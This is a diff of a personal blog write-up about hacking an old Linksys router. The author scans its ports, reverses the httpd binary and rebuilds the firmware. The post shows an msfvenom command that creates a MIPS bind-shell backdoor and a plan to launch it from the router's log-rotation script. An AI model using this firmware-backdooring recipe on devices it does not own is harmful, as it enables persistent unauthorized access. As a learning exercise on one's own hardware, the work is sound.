@@ -6,7 +6,7 @@ categories: exploitation
 ---
 # Preface
 There is a point in a man's (or woman's) life where he wakes up and decides that he needs to learn some embedded, or hardware-related cyber.
-I had a friend of mine who tell me he had found an old router laying around, and asked if I would like to recieve it.
+Recently, a friend of mine told me he had found an old router laying around, and asked if I would like to recieve it.
 I knew it was time.
 ![linksys_router](https://user-images.githubusercontent.com/53023744/196064650-137f185d-7708-45a7-8b88-ed1d16f43112.jpg)
 
@@ -18,7 +18,7 @@ Find an RCE vulnerabillity (post auth), or somehow pop a reverse shell on the ro
 
 # Attack Surface
 #### NMAP
-I started with enumerating all of the open ports on the device with `nmap`.
+I started by enumerating all of the open ports on the device with `nmap`.
 This is the scan result:
 ```
 Nmap scan report for 192.168.1.1
@@ -72,12 +72,13 @@ Luckily enough, I eventually found the right firmware in some [forum](https://fo
 You can dowload it here if the site is down: [WRT160Nv3_0_03_003.zip](https://github.com/MaximAshin/MaximAshin.github.io/files/9795539/WRT160Nv3_0_03_003.zip)
 
 
-# Reversing httpd - TODO!!!!!!!!!!!!!!!!!!!!!!!!!
+# Reversing httpd - TODO
 Following the [article](https://elongl.github.io/exploitation/2021/05/30/pwning-home-router.html) Elon wrote, I reversed the httpd binary and searched for dangerous function calls like system(), eval() etc...
-Also, I tried to find mentions of nvram_get() (nvram == non volatile ram == stays on the disk) to see if there's any unsanitized user input being used in important places.
+Also, I tried to find mentions of nvram_get() (nvram == non volatile ram) to see if there's any unsanitized user input being used in important places.
+After a few hours, it looked like all the previously known vulns were closed off.
 
 
-# Let's Build a Firmware!
+# Let's Build a Firmware?
 After spending a few hours reversing httpd, I thought to myself that I should try re-building the firmware with my own reverse-shell.
 I knew this wasn't any fancy RCE exploit, but a common problem with wacky routers.
 Still, I believe this is a handy trick to learn.
@@ -114,7 +115,7 @@ fmk/rootfs/bin/busybox: ELF 32-bit LSB executable, MIPS, MIPS-I version 1 (SYSV)
 Now let's get to the step where we build our custom reverse-shell, compiled to 32bit mipsel (mipsel == MIPS little-endian).
 
 #### msfvenom
-msfvenom is a handy utility that allows us to create (common-use-case) binaries/payloads.
+msfvenom is a handy utility that allows us to create binary payloads.
 In my case, I searched for payloads that run on mipsel architecture.
 
 ```msfvenom -l payloads | grep mipsle```
@@ -122,8 +123,7 @@ In my case, I searched for payloads that run on mipsel architecture.
 ![image](https://user-images.githubusercontent.com/53023744/196055645-ef0680da-0e41-45f0-8bd2-2f577fc7628f.png)
 
 
-As we can see, I can create a simple bind shell (listens in a given port and waits for a connection).
-We can create the binary itself like so:
+As we can see, I can created a simple bind shell (listens on a given port and waits for a connection).
 
 ```
 msfvenom -p linux/mipsle/shell_bind_tcp LPORT=50505 -f elf > bs_backdoor
@@ -134,9 +134,9 @@ chmod 777 /fmk/rootfs/bin/bs_backdoor
 
 But wait!
 What would make our binary run at all?
-Well, bash scripts :)
+How would our bind shell run when the router boots?
 
-In many routers, there are a some scripts that run on startup, or on some particular occasion.
+In many routers, there are a some bash scripts that run on startup, or on some particular occasions.
 We can search for such scripts like so:
 
 ```
@@ -145,7 +145,8 @@ Output:
 fmk/rootfs/usr/sbin/rotatelog.sh
 ```
 
-We can modify the script and run our binary from there!
+In this case, we found a bash script that (probably) runs every time the router rotates it's logs.
+We can modify the script and run our binary each time the logs rotate, as it seems like this script is executed often.
 ![image](https://user-images.githubusercontent.com/53023744/196065187-621f4102-1e10-439c-a418-1cf30a08ea7f.png)
 
 
